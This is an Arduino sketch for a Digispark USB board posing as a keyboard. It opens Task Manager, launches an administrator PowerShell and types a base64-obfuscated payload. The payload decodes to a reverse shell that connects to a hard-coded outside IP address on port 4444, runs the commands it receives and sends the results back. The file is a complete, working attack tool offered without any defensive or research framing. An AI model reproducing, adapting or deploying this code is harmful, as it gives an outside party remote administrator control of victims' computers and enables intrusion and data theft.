#include "DigiKeyboard.h"

#define KEY_TAB    0x2B
#define KEY_ENTER  0x28
#define KEY_SPACE  0x2C
#define KEY_N      0x11
#define MOD_ALT    0x04
#define MOD_CONTROL 0x01
#define MOD_SHIFT 0x02

void setup() {
  pinMode(1, OUTPUT);
}

void loop() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);

  // Open Task Manager (Ctrl+Shift+Esc)
  DigiKeyboard.sendKeyStroke(0x29, MOD_CONTROL | MOD_SHIFT);
  DigiKeyboard.delay(5000);

  // Open "Create new task" dialog by Alt+N
  DigiKeyboard.sendKeyStroke(KEY_N, MOD_ALT);
  DigiKeyboard.delay(2000);

  // Type "cmd"
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(1500);

  // Tab to checkbox
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(500);

  // Space to check "Run as admin"
  DigiKeyboard.sendKeyStroke(KEY_SPACE);
  DigiKeyboard.delay(1000);

  // Enter to run powershell
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);

  // Correct encoded payload with -NoExit added so window stays open,
  // using single quotes around encoded string to fix terminator error.
  DigiKeyboard.println(F(
  "Invoke-Expression ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAzAC4ANgAyAC4ANQA4AC4AMQA0ADcAJwAsACAANAA0ADQANAApADsACgAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwAKAFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAIAB8ACAAJQAgAHsAMAB9ADsACgB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApACAAewAKACAAIAAgACAAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAgADAALAAgACQAaQApADsACgAgACAAIAAgACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQA7AAoAIAAgACAAIAAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAKACAAIAAgACAAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAKACAAIAAgACAAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAIAAwACwAIAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAKACAAIAAgACAAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAOwAKAH0ACgAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=')))"
));

  // Turn LED on
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(90000);

  digitalWrite(1, LOW);
  DigiKeyboard.delay(5000);
}
